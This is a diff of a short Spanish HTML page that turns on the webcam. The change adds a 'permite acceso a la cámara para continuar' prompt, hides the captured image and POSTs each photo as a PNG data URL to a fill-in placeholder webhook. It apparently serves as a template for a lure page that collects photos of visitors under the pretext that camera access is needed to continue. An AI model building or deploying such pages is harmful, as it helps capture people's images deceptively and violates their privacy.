@@ -2,13 +2,13 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
-  <title>Captura de Foto</title>
+  <title>Captura y envío de foto</title>
 </head>
 <body>
-  <h2>Haz clic para tomar tu foto</h2>
+  <h2>Permite acceso a la cámara para continuar</h2>
   <video id="video" width="320" height="240" autoplay></video><br />
   <button id="snap">Tomar foto</button><br />
-  <canvas id="canvas" width="320" height="240"></canvas>
+  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
   <script>
     const video = document.getElementById('video');
@@ -16,18 +16,23 @@
     const snap = document.getElementById('snap');
     const context = canvas.getContext('2d');
 
-    // Pedir permiso y mostrar video
+    // Iniciar cámara
     navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        video.srcObject = stream;
-      })
-      .catch(err => {
-        alert('Error al acceder a la cámara: ' + err);
-      });
+      .then(stream => { video.srcObject = stream; })
+      .catch(err => { alert('No se pudo acceder a la cámara: ' + err); });
 
     snap.addEventListener('click', () => {
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
-      alert('Foto tomada. Ahora puedes compartirla.');
+      const dataUrl = canvas.toDataURL('image/png');
+
+      // Enviar foto al Webhook
+      fetch('AQUI_TU_WEBHOOK', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ imagen: dataUrl })
+      })
+      .then(res => alert('Foto enviada correctamente'))
+      .catch(err => alert('Error enviando foto: ' + err));
     });
   </script>
 </body>
